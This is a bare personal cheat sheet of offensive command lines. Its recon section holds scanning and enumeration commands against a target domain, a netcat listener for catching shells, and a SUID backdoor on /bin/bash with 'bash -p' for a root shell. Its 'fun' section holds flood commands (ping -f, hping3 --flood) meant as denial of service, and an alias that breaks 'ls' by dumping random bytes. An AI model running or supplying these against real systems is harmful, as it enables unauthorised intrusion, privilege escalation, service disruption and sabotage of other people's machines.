# Hacking Stuff

------------------------------------------------------- 
                      # RECON STUFF
------------------------------------------------------- 

------------------------------------------------------- 
rustscan -a domain.com
------------------------------------------------------- 
urlfinder -d domain.com -o domain.txt

nikto -h domain.com

amass enum -d domain.com

curl -i domain.com
whois domain.com
whatweb domain.com

sudo nmap -sS -sV -T4 domain.com

gobuster dir -u domain.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u domain.com -w /usr/share/seclists/



sublist3r -d domain.com


tshark -Y'http.request.method == "GET" -i eth0


wpscan --url domain.com --enumerate u
wpscan --url domain.com --enumerate vp,vt --plugins-detection

nc -lvnp 1234



sudo chmod +s /bin/bash
bash -p




------------------------------------------------------- 
                      # FUN STUFF
------------------------------------------------------- 

ping -s 1300 -f domain.com

hping3 -S -V --flood domain.com

hping3 --traceroute -V -1 domain.com

cat /dev/urandom
alias ls="cat /dev/urandom"


